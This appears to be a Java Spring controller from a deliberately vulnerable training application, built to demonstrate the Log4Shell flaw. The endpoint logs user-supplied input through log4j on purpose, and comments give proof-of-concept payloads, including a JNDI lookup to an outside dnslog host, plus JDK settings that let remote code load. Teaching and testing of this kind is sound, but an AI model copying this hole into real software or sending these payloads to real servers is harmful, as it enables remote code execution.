package com.example.vulnerablejava.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "Log4Shell")
@RestController
@RequestMapping("log4j")
public class Log4jController {
    private static final Logger logger = LogManager.getLogger();

    /**
     * 存在漏洞，
     * poc1: log4j/1?msg=${sys:user.name}
     * poc2: /log4j/1?msg=${jndi:ldap://xxx.dnslog.cn}
     */
    @ApiOperation("存在log4shell漏洞")
    @GetMapping("1")
    public String log1(String msg) {
        // JDK 高于 6u211，7u201, 8u191, 11.0.1时, 需要设置trustURLCodebase
        // System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        // System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        logger.fatal(msg);
        logger.error(msg);
        logger.warn(msg);
        logger.info(msg);
        logger.debug(msg);
        logger.trace(msg);
        return msg;
    }

    /**
     * 修复漏洞
     * 升级log4j版本
     */
}
